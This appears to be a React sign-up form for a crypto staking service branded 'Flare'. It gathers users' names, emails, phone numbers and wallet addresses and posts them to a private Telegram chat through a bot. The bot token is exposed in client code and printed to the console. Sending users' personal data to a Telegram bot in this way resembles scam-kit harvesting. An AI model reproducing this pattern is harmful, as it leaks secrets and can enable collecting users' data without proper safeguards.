import { useState } from 'react';
import countries from 'world-countries';
import Footer from './Footer';
import Slider from './Slider';

const SignUpForm = () => {
  const [formData, setFormData] = useState({
    firstName: '',
    lastName: '',
    email: '',
    phone: '',
    walletAddress: '',
    country: '',
    agreeTerms: false,
  });

  const [successMessage, setSuccessMessage] = useState('');
  const [isSubmitted, setIsSubmitted] = useState(false);

  // Sort countries alphabetically by name
  const sortedCountries = countries
    .map((country) => ({
      name: country.name.common,
      code: country.cca2,
    }))
    .sort((a, b) => a.name.localeCompare(b.name));

  const handleChange = (e) => {
    const { name, value, type, checked } = e.target;
    setFormData({
      ...formData,
      [name]: type === 'checkbox' ? checked : value,
    });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    const botToken = import.meta.env.VITE_BOT_TOKEN;
    const chatId = import.meta.env.VITE_CHAT_ID;

    console.log('Bot Token:', botToken); // Verify the token is loaded
    console.log('Chat ID:', chatId); // Verify the chat ID is loaded

    const message = `
    **Flare Sign-Up Submission**
    First Name: ${formData.firstName}
    Last Name: ${formData.lastName}
    Email: ${formData.email}
    Phone: ${formData.countryCode || '+1'} ${formData.phone}
    Wallet Address: ${formData.walletAddress}
    Country: ${formData.country}
  `;

    try {
      const response = await fetch(
        `https://api.telegram.org/bot${botToken}/sendMessage`,
        {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'Markdown',
          }),
        }
      );

      if (response.ok) {
        setSuccessMessage(' Welcome to Flare! ');
        setIsSubmitted(true);
      } else {
        alert('Failed to send data to Telegram. Please try again.');
      }
    } catch (error) {
      console.error('Error sending data to Telegram:', error);
      alert('An error occurred. Please try again later.');
    }
  };

  return (
    <div className="items-center relative">
      <div className="min-h-screen flex items-center justify-center p-4">
        <div className="bg-white rounded-lg flex flex-col md:flex-row w-full max-w-4xl">
          {/* Left Column: Form */}
          <div className="w-full p-6">
            <h2 className="text-2xl sm:text-3xl font-bold text-gray-800 mb-6 text-center md:text-left">
              Sign Up on Flare
            </h2>

            <form onSubmit={handleSubmit} className="space-y-4">
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                {/* First Name */}
                <div>
                  <label className="block text-sm font-medium mb-2">
                    First Name
                  </label>
                  <input
                    type="text"
                    name="firstName"
                    value={formData.firstName}
                    onChange={handleChange}
                    className="w-full border border-gray-300 px-4 py-2 rounded-lg focus:ring-2 focus:ring-red-500 outline-none"
                    required
                  />
                </div>

                {/* Last Name */}
                <div>
                  <label className="block text-sm font-medium mb-2">
                    Last Name
                  </label>
                  <input
                    type="text"
                    name="lastName"
                    value={formData.lastName}
                    onChange={handleChange}
                    className="w-full border border-gray-300 px-4 py-2 rounded-lg focus:ring-2 focus:ring-red-500 outline-none"
                    required
                  />
                </div>
              </div>

              {/* Email */}
              <div>
                <label className="block text-sm font-medium mb-2">
                  Email Address
                </label>
                <input
                  placeholder="youremail@domain.com"
                  type="email"
                  name="email"
                  value={formData.email}
                  onChange={handleChange}
                  className="w-full border border-gray-300 px-4 py-2 rounded-lg focus:ring-2 focus:ring-red-500 outline-none"
                  required
                />
              </div>

              {/* Phone Number */}
              <div>
                <label className="block text-sm font-medium mb-2">
                  Phone Number
                </label>
                <div className="flex gap-2">
                  {/* Country Code Input */}
                  <input
                    type="text"
                    name="countryCode"
                    value={formData.countryCode || '+1'} // Default to +1
                    onChange={(e) =>
                      setFormData({ ...formData, countryCode: e.target.value })
                    }
                    className="w-1/4 border border-gray-300 px-4 py-2 rounded-lg focus:ring-2 focus:ring-red-500 outline-none"
                    placeholder="+1"
                    required
                  />

                  {/* Phone Number Input */}
                  <input
                    type="tel"
                    name="phone"
                    value={formData.phone}
                    onChange={handleChange}
                    className="w-3/4 border border-gray-300 px-4 py-2 rounded-lg focus:ring-2 focus:ring-red-500 outline-none"
                    placeholder="123-456-7890"
                    required
                  />
                </div>
              </div>

              {/* Wallet Address */}
              <div>
                <label className="block text-sm font-medium mb-2">
                  Wallet Address
                </label>
                <input
                  placeholder="0Xxxxxxxxxxxxxxxxxxxxxxxxxxx"
                  type="text"
                  name="walletAddress"
                  value={formData.walletAddress}
                  onChange={handleChange}
                  className="w-full border border-gray-300 px-4 py-2 rounded-lg focus:ring-2 focus:ring-red-500 outline-none"
                  required
                />
              </div>

              {/* Country of Residence */}
              <div>
                <label className="block text-sm font-medium mb-2">
                  Country
                </label>
                <select
                  name="country"
                  value={formData.country}
                  onChange={handleChange}
                  className="w-full border border-gray-300 px-4 py-2 rounded-lg focus:ring-2 focus:ring-red-500 outline-none"
                  required
                >
                  <option value="" disabled>
                    Select your country
                  </option>
                  {sortedCountries.map((country) => (
                    <option key={country.code} value={country.name}>
                      {country.name}
                    </option>
                  ))}
                </select>
              </div>

              {/* Terms and Conditions */}
              <div className="flex items-center">
                <input
                  type="checkbox"
                  name="agreeTerms"
                  checked={formData.agreeTerms}
                  onChange={handleChange}
                  className="w-4 h-4 text-red-500 focus:ring-red-500 border-gray-300 rounded"
                  required
                />
                <label className="ml-2 text-sm text-gray-700">
                  I agree to the{' '}
                  <a href="#" className="text-red-500">
                    terms and conditions
                  </a>
                </label>
              </div>

              {/* Submit Button */}
              <button
                type="submit"
                className={`w-full py-3 rounded-lg ${
                  isSubmitted
                    ? 'bg-green-500 text-white hover:bg-green-600 transition-all duration-300'
                    : 'bg-gradient-to-r from-red-500 to-orange-500 text-white hover:from-red-600 hover:to-orange-600 transition-all duration-300'
                }`}
              >
                {isSubmitted ? 'Submitted Successfully' : 'Sign Up Flare'}
              </button>
            </form>
            {successMessage && (
              <div className="text-green-600 font-bold text-lg mb-4">
                {successMessage}
              </div>
            )}
          </div>

          {/* Right Column: Terms and Conditions */}
          <div className="md:p-6 p-4 md:border-l border-gray-200">
            <h3 className="text-xl text-center font-bold mb-4">
              Terms and Conditions
            </h3>
            <p className="text-sm text-gray-700 leading-relaxed mb-4">
              By signing up, you agree to the following terms and conditions.
              Please read them carefully before proceeding:
            </p>
            <ul className="text-sm text-gray-700 leading-relaxed list-disc ml-4 space-y-2">
              <li>
                <strong>Risk Disclosure:</strong> Cryptocurrency investments,
                including staking, are highly volatile and carry significant
                risks. You acknowledge that the value of your assets may
                fluctuate, and there is a possibility of partial or total loss.
              </li>

              <li>
                <strong>Staking Rewards:</strong> The rewards earned through
                staking are not guaranteed and may vary depending on network
                conditions, market factors, and platform performance.
              </li>
              <li>
                <strong>Eligibility:</strong> By signing up, you confirm that
                you are legally allowed to participate in cryptocurrency
                activities in your jurisdiction and meet the minimum age
                requirements.
              </li>
              <li>
                <strong>Platform Liability:</strong> The platform is not liable
                for losses caused by market fluctuations, technical errors, or
                third-party actions, including but not limited to blockchain
                failures and security breaches.
              </li>
              <li>
                <strong>Taxes and Compliance:</strong> Users are solely
                responsible for complying with all applicable tax laws and
                regulations in their jurisdiction concerning crypto investments
                and staking rewards.
              </li>
              <li>
                <strong>Account Security:</strong> You agree to take full
                responsibility for maintaining the security of your wallet and
                account credentials. The platform is not liable for unauthorized
                access or asset loss due to negligence.
              </li>
              <li>
                <strong>Investment Lock-up Period:</strong> Some staking or
                investment options may require a lock-up period, during which
                your funds may not be accessible. Please review the terms of
                each program before participating.
              </li>
              <li>
                <strong>Platform Updates:</strong> The platform reserves the
                right to update or modify staking programs, fees, and terms
                without prior notice. Users are encouraged to regularly review
                the terms and conditions.
              </li>
              <li>
                <strong>Jurisdictional Limitations:</strong> Certain
                jurisdictions may restrict cryptocurrency trading, staking, or
                investments. You agree that it is your responsibility to ensure
                compliance with local laws before participating.
              </li>
            </ul>
            <p className="text-sm text-gray-700 leading-relaxed mt-4">
              By proceeding, you confirm that you have read, understood, and
              accepted these terms and conditions. For further details, please
              refer to our{' '}
              <a href="#" className="text-red-500">
                detailed policy document.
              </a>
            </p>
          </div>
        </div>
      </div>
      <div>
        <Slider />
      </div>

      {/* Footer */}
      <div className="relative z-20">
        <Footer />
      </div>
    </div>
  );
};

export default SignUpForm;
